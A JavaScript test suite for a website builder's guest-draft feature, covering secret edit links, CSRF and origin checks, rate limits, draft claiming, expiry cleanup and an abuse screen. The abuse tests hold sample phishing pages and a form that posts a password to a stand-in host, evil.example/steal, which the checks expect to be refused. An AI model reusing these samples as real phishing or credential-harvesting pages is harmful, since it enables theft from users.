'use strict';
/**
 * Guest drafts (openvibe.website, plan 5.9: "making websites and code without needing OpenVibe logins"): a visitor
 * who is not signed in makes a draft on openvibe.space with a secret edit link, edits it and previews it with that
 * secret, and a signed-in person who holds it claims the draft. What a guest may not do (publish, keep a visitor's
 * data, run server functions), what the abuse screen refuses (a phishing page, a form that posts off-site), the
 * limits (per address, per draft, per service) and the job that removes a draft whose week is up.
 *
 * The limits are lowered here so the suite stays quick; the defaults (three drafts and two AI builds per address a
 * day, twenty AI changes per draft, five hundred drafts a day for the service, seven days) are checked below.
 */
const assert = require('assert');
const crypto = require('crypto');
const { boot, check, done } = require('./stageb/boot');
const { csrfToken, scopeToken } = require('../server/auth/forms');
const templates = require('../server/spaces/templates');

const ORIGIN = 'https://openvibe.space';
const SITE_TEMPLATES = templates.sites();

/** The AI that answers at once, so a guest's builds and changes can be polled. */
function fakeAi() {
    const calls = [];
    const runs = new Map();
    return {
        calls, runs,
        client: {
            runs: {
                async create(workflow, input, o) {
                    calls.push({ workflow, input, o });
                    const id = `run_${runs.size + 1}`;
                    runs.set(id, {
                        id, status: 'succeeded',
                        output: {
                            name: 'Guest site', description: 'A site a guest made.', instructions: '', capabilities: ['profile', 'data'],
                            files: [{ path: 'index.html', content: '<!doctype html><html><body><h1>Hello</h1></body></html>' }],
                        },
                    });
                    return { run: { id, status: 'succeeded' } };
                },
                async get(id) { return { run: runs.get(id) }; },
            },
        },
    };
}

(async () => {
    const ai = fakeAi();
    const t = await boot({
        spacesAiClient: ai.client,
        env: {
            SPACE_GUEST_DRAFTS_PER_IP_PER_DAY: '3',
            SPACE_GUEST_AI_BUILDS_PER_IP_PER_DAY: '5',
            SPACE_GUEST_AI_EDITS_PER_DRAFT: '2',
            SPACE_GUEST_DRAFTS_PER_DAY: '100',
        },
    });
    const alice = t.user('alice');
    const csrf = (u) => csrfToken(t.config, { subject: u.subject });
    const guestCsrf = (id) => scopeToken(t.config, `guest:${id}`);
    const ip = (n) => ({ origin: ORIGIN, 'x-forwarded-for': `203.0.113.${n}` });

    /** A guest draft from a template: the answer is the secret edit link. */
    const makeDraft = async (template, { address = 1, prompt = null } = {}) => {
        const r = await t.api('POST', '/spaces/guest', {
            form: template ? { template } : { prompt },
            headers: ip(address),
        });
        assert.strictEqual(r.status, 303, `the draft: ${r.status} ${r.text.slice(0, 200)}`);
        const m = /^\/spaces\/(spc_[0-9A-HJKMNP-TV-Z]{26})\/edit\?key=([A-Za-z0-9_-]+)$/.exec(r.headers.location);
        assert.ok(m, r.headers.location);
        return { id: m[1], key: m[2], res: r };
    };
    /** The editor's headers for a guest draft: its secret and its own form token. */
    const asGuest = (id, key, address = null) => Object.assign(
        { origin: ORIGIN, 'x-space-key': key, 'x-csrf-token': guestCsrf(id) },
        address ? { 'x-forwarded-for': `203.0.113.${address}` } : {},
    );

    await check('the start page asks for a template or a sentence, and no account', async () => {
        const page = await t.api('GET', '/spaces/guest');
        assert.strictEqual(page.status, 200);
        assert.match(page.text, /<form method="post" action="\/spaces\/guest">/);
        for (const tpl of SITE_TEMPLATES) assert.ok(page.text.includes(`name="template" value="${tpl.id}"`), tpl.id);
        assert.match(page.headers['content-security-policy'], /form-action 'self'/);
        assert.match(page.text, /<meta name="robots" content="noindex,nofollow">/);
    });

    await check('a guest makes a draft from every website template', async () => {
        for (const [i, tpl] of SITE_TEMPLATES.entries()) {
            const { id, key, res } = await makeDraft(tpl.id, { address: 100 + i });
            const space = await t.ctx.spaces.get(id);
            assert.ok(space, `the draft ${tpl.id} exists`);
            assert.deepStrictEqual([space.owner_subject, space.template, space.guest_hash !== null], [null, tpl.id, true]);
            assert.deepStrictEqual((await t.ctx.spaces.files(space)).map((f) => f.path), ['index.html']);
            assert.strictEqual(res.headers['set-cookie'].length, 1);
            const cookie = res.headers['set-cookie'][0];
            assert.match(cookie, /^spc_key_spc_/, cookie);
            assert.match(cookie, /HttpOnly/, cookie);
            assert.match(cookie, /SameSite=Lax/, cookie);
            assert.match(cookie, new RegExp(`Path=/spaces/${id}`), cookie);
            assert.ok(!/Domain=/.test(cookie), 'host-only: openvibe.space and nothing else');
            // The secret is what opens it.
            const ed = await t.api('GET', `/spaces/${id}/edit?key=${encodeURIComponent(key)}`);
            assert.strictEqual(ed.status, 200, ed.text.slice(0, 200));
            const bootJson = JSON.parse(/<script type="application\/json" id="sp-boot">([\s\S]*?)<\/script>/.exec(ed.text)[1]);
            assert.strictEqual(bootJson.base, `/spaces/${id}`);
            assert.strictEqual(bootJson.guest.key, key);
            assert.strictEqual(bootJson.canPublish, false, 'a guest draft is not published');
            assert.doesNotMatch(ed.text, /id="ed-publish"/, 'no Publish button for a guest');
        }
    });

    await check('only the hash of the secret is kept, and the secret is compared in constant time', async () => {
        const { id, key } = await makeDraft('site-portfolio', { address: 120 });
        const row = await t.ctx.store.db.prepare('SELECT guest_hash, guest_ip FROM space_apps WHERE id = ?').get(id);
        assert.notStrictEqual(row.guest_hash, key, 'the secret itself is never stored');
        assert.match(row.guest_hash, /^[0-9a-f]{64}$/, 'sha256, hex');
        assert.strictEqual(row.guest_ip, '203.0.113.120');
        const guest = require('../server/spaces/guest');
        assert.strictEqual(guest.keyMatches(row.guest_hash, key), true);
        assert.strictEqual(guest.keyMatches(row.guest_hash, `${key}x`), false);
        assert.strictEqual(guest.keyMatches(row.guest_hash, ''), false);
        assert.strictEqual(guest.keyMatches(row.guest_hash, undefined), false);
        assert.strictEqual(guest.keyMatches('not-a-hash', key), false);
        // The comparison is constant time: the hashes are compared with timingSafeEqual.
        assert.match(guest.keyMatches.toString(), /timingSafeEqual/);
    });

    await check('the secret is needed: no key, or the wrong key, is refused', async () => {
        const { id, key } = await makeDraft('site-links', { address: 121 });
        assert.strictEqual((await t.api('GET', `/spaces/${id}/edit`)).status, 403, 'no key at all');
        assert.strictEqual((await t.api('GET', `/spaces/${id}/edit?key=nope`)).status, 403, 'the wrong key');
        assert.strictEqual((await t.api('GET', `/spaces/${id}/edit?key=${encodeURIComponent(key)}`)).status, 200, 'the right key');
        // The cookie alone opens it too (the link alone works as well).
        const cookie = `spc_key_${id}=${key}`;
        const withCookie = await t.api('GET', `/spaces/${id}/edit`, { headers: { cookie } });
        assert.strictEqual(withCookie.status, 200, 'the cookie remembers the secret');
        // A stranger who is signed in is still refused.
        assert.strictEqual((await t.api('GET', `/spaces/${id}/edit?key=nope`, { session: alice })).status, 403);
    });

    await check('the editor and its preview work with the secret, exactly as for a maker', async () => {
        const { id, key } = await makeDraft('site-bakery', { address: 122 });
        const headers = asGuest(id, key, 122);
        const put = await t.api('PUT', `/spaces/${id}/files`, { json: { files: [{ path: 'index.html', content: '<!doctype html><html><body><h1>Mine</h1></body></html>' }] }, headers });
        assert.strictEqual(put.status, 200, put.text.slice(0, 200));
        const saved = await t.ctx.spaces.files(await t.ctx.spaces.get(id));
        assert.deepStrictEqual(saved.map((f) => f.path), ['index.html']);
        assert.match(saved[0].content, /Mine/);
        // Without the form token the call is refused, as it is for a maker.
        const noToken = await t.api('PUT', `/spaces/${id}/files`, { json: { files: [{ path: 'index.html', content: 'x' }] }, headers: { origin: ORIGIN, 'x-space-key': key } });
        assert.strictEqual(noToken.status, 403);
        // From another origin the call is refused, as it is for a maker.
        const crossSite = await t.api('PUT', `/spaces/${id}/files`, { json: { files: [{ path: 'index.html', content: 'x' }] }, headers: { origin: 'https://evil.example', 'x-space-key': key, 'x-csrf-token': guestCsrf(id) } });
        assert.strictEqual(crossSite.status, 403);
        // The preview runs the draft: nobody is signed in, and the SDK says so instead of failing.
        const preview = (op, args) => t.api('POST', `/spaces/${id}/preview`, { json: { op, args }, headers });
        assert.strictEqual((await preview('me')).json().result, null);
        const add = await preview('items.add', { collection: 'notes', value: { text: 'hi' } });
        assert.strictEqual(add.status, 200);
        assert.deepStrictEqual(add.json().result, { error: 'sign_in_required', message: 'Sign in to use this' });
        assert.deepStrictEqual((await preview('items.list', { collection: 'notes' })).json().result, []);
        assert.deepStrictEqual((await preview('kv.set', { key: 'a', value: 1 })).json().result, { error: 'sign_in_required', message: 'Sign in to use this' });
        // The AI: the draft changes, and the answer is applied to the draft.
        const aiCall = await t.api('POST', `/spaces/${id}/ai`, { json: { prompt: 'make it blue' }, headers });
        assert.strictEqual(aiCall.status, 200, aiCall.text.slice(0, 200));
        const done1 = await t.api('GET', `/spaces/${id}/ai`, { headers });
        assert.strictEqual(done1.json().status, 'done');
        assert.deepStrictEqual(done1.json().space.capabilities, [], 'a guest draft asks no visitor for anything');
        assert.strictEqual(done1.json().files[0].path, 'index.html');
        const build = ai.calls.filter((c) => c.workflow === 'space.app.build').pop();
        assert.strictEqual(build.o.onBehalfOf, undefined, 'a guest has no person to act for');
        assert.deepStrictEqual(build.o.attribution, { service: 'space', type: 'space', id });
    });

    await check('a guest never publishes, keeps no visitor data and runs no functions', async () => {
        const { id, key } = await makeDraft('site-landing', { address: 123 });
        const headers = asGuest(id, key, 123);
        const pub = await t.api('POST', `/spaces/${id}/publish`, { headers });
        assert.strictEqual(pub.status, 403);
        assert.strictEqual(pub.json().error.code, 'space.guest_cannot_publish');
        const unpub = await t.api('POST', `/spaces/${id}/unpublish`, { headers });
        assert.strictEqual(unpub.status, 403);
        const fn = await t.api('POST', `/spaces/${id}/preview`, { json: { op: 'fn.call', args: { name: 'check' } }, headers });
        assert.strictEqual(fn.status, 403);
        assert.strictEqual(fn.json().error.code, 'space.guest_no_functions');
        // Nothing of a visitor's was written: the draft has no lists and no storage.
        const items = await t.ctx.store.db.prepare('SELECT COUNT(*) AS n FROM space_app_items WHERE space_id = ?').get(id);
        const kv = await t.ctx.store.db.prepare('SELECT COUNT(*) AS n FROM space_app_kv WHERE space_id = ?').get(id);
        assert.strictEqual(Number(items.n), 0);
        assert.strictEqual(Number(kv.n), 0);
        // And the draft is not in the gallery.
        assert.ok(!(await t.ctx.spaces.gallery({})).some((s) => s.id === id));
    });

    await check('the limits: three drafts a day per address', async () => {
        for (let i = 0; i < 3; i++) {
            const r = await t.api('POST', '/spaces/guest', { form: { template: 'site-bakery' }, headers: ip(130) });
            assert.strictEqual(r.status, 303, `draft ${i + 1}: ${r.status}`);
        }
        const fourth = await t.api('POST', '/spaces/guest', { form: { template: 'site-bakery' }, headers: ip(130) });
        assert.strictEqual(fourth.status, 422);
        assert.match(fourth.text, /3 drafts/);
        // Another address has its own three.
        assert.strictEqual((await t.api('POST', '/spaces/guest', { form: { template: 'site-bakery' }, headers: ip(131) })).status, 303);
    });

    await check('the limits: two AI changes per draft', async () => {
        const { id, key } = await makeDraft('site-event', { address: 140 });
        const headers = asGuest(id, key, 140);
        for (let i = 0; i < 2; i++) {
            const r = await t.api('POST', `/spaces/${id}/ai`, { json: { prompt: `change ${i}` }, headers });
            assert.strictEqual(r.status, 200, r.text.slice(0, 200));
            assert.strictEqual((await t.api('GET', `/spaces/${id}/ai`, { headers })).json().status, 'done');
        }
        const over = await t.api('POST', `/spaces/${id}/ai`, { json: { prompt: 'one more' }, headers });
        assert.strictEqual(over.status, 429);
        assert.match(over.json().error.message, /2 AI changes/);
    });

    await check('the limits: five AI builds a day per address, over the drafts', async () => {
        // Two changes in each of two drafts, then one more in a third: the address is used up.
        const drafts = [];
        for (const address of [150, 151, 152]) drafts.push(await makeDraft('site-event', { address: 150 }));
        const heads = { origin: ORIGIN, 'x-forwarded-for': '203.0.113.150' };
        let calls = 0;
        for (const d of drafts) {
            // Two changes in the first two drafts, one in the third: five builds for this address.
            const rounds = d === drafts[2] ? 1 : 2;
            for (let i = 0; i < rounds; i++) {
                const headers = Object.assign({}, heads, { 'x-space-key': d.key, 'x-csrf-token': guestCsrf(d.id) });
                const r = await t.api('POST', `/spaces/${d.id}/ai`, { json: { prompt: `change ${calls}` }, headers });
                assert.strictEqual(r.status, 200, r.text.slice(0, 200));
                assert.strictEqual((await t.api('GET', `/spaces/${d.id}/ai`, { headers })).json().status, 'done');
                calls++;
            }
        }
        assert.strictEqual(calls, 5);
        // The sixth build of this address is refused (the per-draft limit is its own).
        const headers = Object.assign({}, heads, { 'x-space-key': drafts[2].key, 'x-csrf-token': guestCsrf(drafts[2].id) });
        const over = await t.api('POST', `/spaces/${drafts[2].id}/ai`, { json: { prompt: 'one more' }, headers });
        assert.strictEqual(over.status, 429);
        assert.strictEqual(over.json().error.code, 'quota');
        assert.match(over.json().error.message, /5 AI builds/);
    });

    await check('a prompt that builds a draft spends the same AI allowance', async () => {
        const promptBuild = await t.api('POST', '/spaces/guest', { form: { prompt: 'A site for my bakery with today’s hours' }, headers: ip(160) });
        assert.strictEqual(promptBuild.status, 303, promptBuild.text.slice(0, 200));
        assert.ok(ai.calls.some((c) => c.workflow === 'space.app.build' && c.input.prompt.includes('bakery')));
        // The draft is there, with the AI building it.
        const id = /^\/spaces\/(spc_[0-9A-HJKMNP-TV-Z]{26})\//.exec(promptBuild.headers.location)[1];
        const space = await t.ctx.spaces.get(id);
        assert.ok(space.building_run_id, 'the AI is building the draft');
        const key = /key=([A-Za-z0-9_-]+)$/.exec(promptBuild.headers.location)[1];
        const done1 = await t.api('GET', `/spaces/${id}/ai`, { headers: asGuest(id, key, 160) });
        assert.strictEqual(done1.json().status, 'done');
    });

    await check('the abuse screen: a phishing page and a form that posts off-site are refused', async () => {
        const { id, key } = await makeDraft('site-bakery', { address: 170 });
        const headers = asGuest(id, key, 170);
        const phishing = await t.api('PUT', `/spaces/${id}/files`, {
            json: { files: [{ path: 'index.html', content: '<!doctype html><html><body><h1>Sign in to your Google account</h1><input type="password"></body></html>' }] },
            headers,
        });
        assert.strictEqual(phishing.status, 422);
        assert.strictEqual(phishing.json().error.code, 'space.guest_abuse');
        const offsite = await t.api('PUT', `/spaces/${id}/files`, {
            json: { files: [{ path: 'index.html', content: '<!doctype html><html><body><form action="https://evil.example/steal" method="post"><input name="password"></form></body></html>' }] },
            headers,
        });
        assert.strictEqual(offsite.status, 422);
        assert.strictEqual(offsite.json().error.code, 'space.guest_offsite_form');
        // A form on its own address is fine.
        const own = await t.api('PUT', `/spaces/${id}/files`, {
            json: { files: [{ path: 'index.html', content: '<!doctype html><html><body><form action="/thanks" method="post"><input name="email"></form></body></html>' }] },
            headers,
        });
        assert.strictEqual(own.status, 200, own.text.slice(0, 200));
        // The prompt is checked too.
        const prompt = await t.api('POST', '/spaces/guest', { form: { prompt: 'Build me a Google password login page' }, headers: ip(171) });
        assert.strictEqual(prompt.status, 422);
        assert.match(prompt.text, /reads like a scam|asks for a password/);
        // And the AI's answer is checked: a build that answers with a phishing page is refused.
        const build = await makeDraft('site-bakery', { address: 172 });
        ai.runs.set('run_none', { id: 'run_none', status: 'running' });
        const bad = { name: 'Bad', description: '', instructions: '', capabilities: [], files: [{ path: 'index.html', content: '<html><body><h1>Sign in to your Google account</h1><input type="password"></body></html>' }] };
        const space = await t.ctx.spaces.get(build.id);
        await t.ctx.spaces.startBuild(space, 'run_bad', 'make it');
        ai.runs.set('run_bad', { id: 'run_bad', status: 'succeeded', output: bad });
        const refused = await t.api('GET', `/spaces/${build.id}/ai`, { headers: asGuest(build.id, build.key, 172) });
        assert.strictEqual(refused.json().status, 'failed');
        assert.match(refused.json().message, /refused/);
    });

    await check('the claim: a signed-in person who holds the secret keeps the draft', async () => {
        const { id, key } = await makeDraft('site-bakery', { address: 180 });
        // Signed out: no claim (the form sends the person to sign in and comes back).
        const out = await t.api('POST', `/spaces/${id}/claim`, { form: { key }, headers: { origin: ORIGIN } });
        assert.strictEqual(out.status, 303);
        assert.match(out.headers.location, /^\/auth\/login\?next=/);
        // The wrong secret: refused.
        const wrong = await t.api('POST', `/spaces/${id}/claim`, { form: { key: 'nope', csrf: csrf(alice) }, headers: { origin: ORIGIN }, session: alice });
        assert.strictEqual(wrong.status, 403);
        // The right secret and the person's own form token: the draft is theirs.
        const claim = await t.api('POST', `/spaces/${id}/claim`, { form: { key, csrf: csrf(alice) }, headers: { origin: ORIGIN }, session: alice });
        assert.strictEqual(claim.status, 303, claim.text.slice(0, 200));
        const slug = /^\/spaces\/([a-z0-9-]+)$/.exec(claim.headers.location)[1];
        const space = await t.ctx.spaces.get(id);
        assert.deepStrictEqual([space.owner_subject, space.owner_username, space.guest_hash, space.guest_ip, space.guest_expires_at], [alice.subject, 'alice', null, null, null]);
        assert.strictEqual(space.slug, slug);
        assert.strictEqual(space.visibility, 'public');
        // It is an ordinary space now: its page, its editor and its place in the maker's list.
        assert.strictEqual((await t.api('GET', `/spaces/${slug}`, { session: alice })).status, 200);
        assert.strictEqual((await t.api('GET', `/spaces/${slug}/edit`, { session: alice })).status, 200);
        assert.ok((await t.ctx.spaces.mine({ subject: alice.subject, kind: 'user' })).some((s) => s.id === id));
        // The secret is dead: the old link no longer opens it (it is an owned space now).
        assert.strictEqual((await t.api('GET', `/spaces/${id}/edit?key=${encodeURIComponent(key)}`)).status, 401);
        assert.strictEqual((await t.api('GET', `/spaces/${id}/edit?key=${encodeURIComponent(key)}`, { session: t.user('bob') })).status, 404);
        // And a second claim is refused.
        const again = await t.api('POST', `/spaces/${id}/claim`, { form: { key, csrf: csrf(alice) }, headers: { origin: ORIGIN }, session: alice });
        assert.strictEqual(again.status, 404);
        // The claim is a status event.
        const events = await t.events('space.app.claimed');
        assert.strictEqual(events.length, 1);
        assert.deepStrictEqual(events[0].subject, { type: 'space', id });
        assert.deepStrictEqual(events[0].actor, { type: 'user', id: alice.subject });
        assert.strictEqual(events[0].payload.space_id, id);
    });

    await check('a draft whose week is up is gone, and the job removes it', async () => {
        const { id, key } = await makeDraft('site-bakery', { address: 190 });
        const past = t.clock.now() - 8 * 24 * 3600 * 1000;
        await t.ctx.store.db.prepare('UPDATE space_apps SET guest_expires_at = ? WHERE id = ?').run(past, id);
        // An expired draft is not there any more.
        assert.strictEqual((await t.api('GET', `/spaces/${id}/edit?key=${encodeURIComponent(key)}`)).status, 404);
        // The job removes it (and its files).
        const removed = await t.ctx.guestCleanup.run();
        assert.ok(removed >= 1, 'the job removed the expired draft');
        assert.strictEqual(await t.ctx.spaces.get(id), null);
        const files = await t.ctx.store.db.prepare('SELECT COUNT(*) AS n FROM space_app_files WHERE space_id = ?').get(id);
        assert.strictEqual(Number(files.n), 0);
    });

    await check('an edit pushes the draft\'s time up', async () => {
        const { id, key } = await makeDraft('site-bakery', { address: 200 });
        const before = (await t.ctx.spaces.get(id)).guest_expires_at;
        await t.clock.advance(3600 * 1000);
        await t.api('PUT', `/spaces/${id}/files`, { json: { files: [{ path: 'index.html', content: '<!doctype html><html><body><h1>Later</h1></body></html>' }] }, headers: asGuest(id, key, 200) });
        const after = (await t.ctx.spaces.get(id)).guest_expires_at;
        assert.strictEqual(Number(after), Number(before) + 3600 * 1000);
    });

    await check('the draft is never made on openvibe.website, and the website front door is untouched', async () => {
        const onWebsite = await t.get('openvibe.website', '/spaces/guest');
        assert.notStrictEqual(onWebsite.status, 200, 'the website host makes no guest draft');
        const post = await t.get('openvibe.website', '/spaces/guest', { method: 'POST' });
        assert.strictEqual(post.status, 405, 'the website host answers GET and HEAD only');
        const home = await t.get('openvibe.website', '/');
        assert.strictEqual(home.status, 200);
        assert.ok(!home.headers['set-cookie'], 'the website host sets no cookie');
    });

    await t.close();

    // The service-wide cap, on its own (two drafts a day for the whole service).
    const t2 = await boot({ spacesAiClient: fakeAi().client, env: { SPACE_GUEST_DRAFTS_PER_DAY: '2' } });
    await check('the service-wide cap, on its own', async () => {
        const one = await t2.api('POST', '/spaces/guest', { form: { template: 'site-links' }, headers: ip(1) });
        assert.strictEqual(one.status, 303, one.text.slice(0, 200));
        const two = await t2.api('POST', '/spaces/guest', { form: { template: 'site-links' }, headers: ip(2) });
        assert.strictEqual(two.status, 303, two.text.slice(0, 200));
        const three = await t2.api('POST', '/spaces/guest', { form: { template: 'site-links' }, headers: ip(3) });
        assert.strictEqual(three.status, 422);
        assert.match(three.text, /as many drafts today as we can/);
    });
    await t2.close();

    await check('the modules behind the guest drafts, and the editor own script', async () => {
        const fs = require('fs');
        const path = require('path');
        const root = path.join(__dirname, '..');
        const client = fs.readFileSync(path.join(root, 'public', 'js', 'space-editor.js'), 'utf8');
        new Function(client);                                    // it parses
        assert.match(client, /boot\.base/, 'the editor calls the draft\'s own address');
        assert.match(client, /X-Space-Key/, 'and carries the draft\'s secret');
        assert.match(client, /guest \? '\/spaces\/guest'/, 'deleting a draft goes back to the start page');
        const { createSpacesAi } = require('../server/spaces/ai');
        const { createGuestCleanup } = require('../server/spaces/guest-cleanup');
        const { createSpaces } = require('../server/spaces/spaces');
        const render = require('../server/spaces/render');
        assert.strictEqual(typeof createSpacesAi, 'function');
        assert.strictEqual(typeof createGuestCleanup, 'function');
        assert.strictEqual(typeof createSpaces, 'function');
        assert.match(render.guestPage({ templates: [], error: null, prompt: '', aiOn: true }), /Make a site/);
    });

    await check('the defaults, and the content check itself', async () => {
        const { load } = require('../server/hosting-config');
        const g = load({}).spaces.guest;
        assert.deepStrictEqual(
            [g.enabled, g.draftsPerIpPerDay, g.aiBuildsPerIpPerDay, g.aiEditsPerDraft, g.draftsPerDay, g.ttlDays],
            [true, 3, 2, 20, 500, 7],
        );
        const check2 = require('../server/spaces/content-check');
        assert.strictEqual(check2.phishingReason('a shop with opening hours'), null);
        assert.strictEqual(check2.phishingReason('how to choose a password for your site'), null, 'no brand, no refusal');
        assert.ok(check2.phishingReason('Sign in to your Google account'));
        assert.ok(check2.phishingReason('verify your PayPal password'));
        assert.ok(check2.phishingReason('your account has been suspended'));
        assert.strictEqual(check2.offsiteFormReason('<form action="/here" method="post"></form>', { sitesDomain: 'openvibe.website' }), null);
        assert.strictEqual(check2.offsiteFormReason('<form method="post"></form>', { sitesDomain: 'openvibe.website' }), null);
        assert.strictEqual(check2.offsiteFormReason('<form action="https://shop.openvibe.website/orders"></form>', { sitesDomain: 'openvibe.website' }), null, 'the site\'s own address');
        assert.ok(check2.offsiteFormReason('<form action="https://evil.example/x"></form>', { sitesDomain: 'openvibe.website' }));
        assert.ok(check2.offsiteFormReason('<form action="//evil.example/x"></form>', { sitesDomain: 'openvibe.website' }));
        assert.ok(check2.offsiteFormReason('<form action="mailto:a@b.example"></form>', { sitesDomain: 'openvibe.website' }));
    });

    done();
})().catch((err) => { console.error(err); process.exit(1); });
